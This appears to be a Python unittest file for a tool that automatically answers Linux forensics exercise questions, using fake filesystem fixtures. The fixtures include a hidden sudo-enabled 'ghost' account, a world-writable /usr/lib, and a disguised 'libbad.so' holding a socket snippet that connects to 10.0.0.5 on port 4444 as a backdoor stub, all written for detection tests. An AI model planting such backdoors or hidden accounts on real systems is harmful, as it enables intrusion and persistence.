import importlib.util
import os
import tempfile
import unittest
from pathlib import Path

spec = importlib.util.spec_from_file_location('det', Path(__file__).resolve().parents[1] / 'lib/forensics_det.py')
det = importlib.util.module_from_spec(spec)
spec.loader.exec_module(det)


def question(text, number=1):
    return {'content': 'This is a forensics question. Answer it below.\n' + '-' * 40 + f'\n\n{text}\n\nANSWER: \n', 'number': number}


class DetTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        for d in ('etc', 'home/ben/Music', 'home/ben/Documents', 'usr/lib', 'var/lib/dpkg/info'):
            (self.root / d).mkdir(parents=True, exist_ok=True)
        (self.root / 'etc/passwd').write_text('root:x:0:0:root:/root:/bin/bash\nben:x:1000:1000::/home/ben:/bin/bash\nghost:x:112:112::/home/ghost:/bin/bash\n')
        (self.root / 'etc/group').write_text('sudo:x:27:ghost\n')
        (self.root / 'usr/share/base-passwd').mkdir(parents=True)
        (self.root / 'usr/share/base-passwd/passwd.master').write_text('root:x:0:0:::\ndaemon:x:1:1:::\n')

    def tearDown(self):
        self.tmp.cleanup()

    def ev(self, readme=''):
        return det.Evidence(str(self.root), readme)

    def test_hidden_user_is_a_system_uid_account_with_a_shell(self):
        result = det.solve(question('A malicious hidden user was created. What is the username?', 3), self.ev())
        self.assertEqual(result['answers'], ['ghost'])

    def test_media_directory_is_the_folder_holding_most_files(self):
        for n in range(3):
            (self.root / f'home/ben/Music/s{n}.mp3').write_bytes(b'x')
        (self.root / 'home/ben/Documents/one.mp3').write_bytes(b'x')
        result = det.solve(question('What is the full path of the directory that contains the mp3 files?'), self.ev())
        self.assertEqual(result['answers'], ['/home/ben/Music'])

    def test_world_writable_core_directory_found_and_symlink_skipped(self):
        (self.root / 'usr/lib').chmod(0o777)
        os.symlink('usr/lib', self.root / 'lib')
        result = det.solve(question('A user messed up the permissions on a core system directory. Which directory?', 5), self.ev())
        self.assertEqual(result['answers'], ['/usr/lib'])

    def test_readme_usr_prefix_rule(self):
        readme = '<p>NOTE ON FORENSICS QUESTION 2 AND 4: If your path contains /usr, remove that from your answer.</p>'
        self.assertEqual(det.readme_strip_numbers(readme), {2, 4})
        self.assertEqual(det.readme_strip_numbers('Forensics questions are on the Desktop.'), set())

    def test_backdoor_file_must_be_unpackaged_and_contain_shell_code(self):
        (self.root / 'usr/lib/libgood.so').write_text('plain library text')
        (self.root / 'usr/lib/libbad.so').write_text("import socket\ns=socket.socket()\ns.connect(('10.0.0.5', 4444))\n")
        result = det.solve(question('The malicious file created a backdoor for persistence. What is the full file path of the backdoor?', 2), self.ev())
        self.assertEqual(result['answers'], ['/usr/lib/libbad.so'])

    def test_unrelated_question_returns_none(self):
        self.assertIsNone(det.solve(question('What is the airspeed velocity of an unladen swallow?'), self.ev()))


if __name__ == '__main__':
    unittest.main()
